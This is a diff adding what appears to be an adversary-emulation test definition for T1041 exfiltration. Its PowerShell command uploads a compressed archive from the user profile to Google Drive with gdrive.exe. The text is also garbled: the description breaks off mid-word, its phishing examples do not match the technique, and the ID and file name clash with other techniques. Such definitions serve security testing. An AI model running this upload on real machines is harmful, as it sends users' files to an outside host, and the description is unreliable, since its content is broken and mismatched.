@@ -1,0 +1,19 @@
+attack_technique: T1041A
+display_name: 'Exfiltration Over C2 Channel(T1041)'
+atomic_tests: 
+- name: Exfiltration Over C2 Channel(T1041)
+  auto_generated_guid: 16a46e21-5e8b-440f-8613-30114b8fcd71
+  description: |
+    Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.ave been notable incidents where Exfiltration Over C2 Channel(T1041) has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.[1] The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.[2]
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Path where resulting compressed data should be placed
+      type: Path
+      default: '%USERPROFILE%\T1560.001-data.rar'
+  executor:
+    command: |
+      C:\Users\USER.CONTOSO\Desktop\tools\gdrive.exe upload {output_file}
+     
+    name: powershell
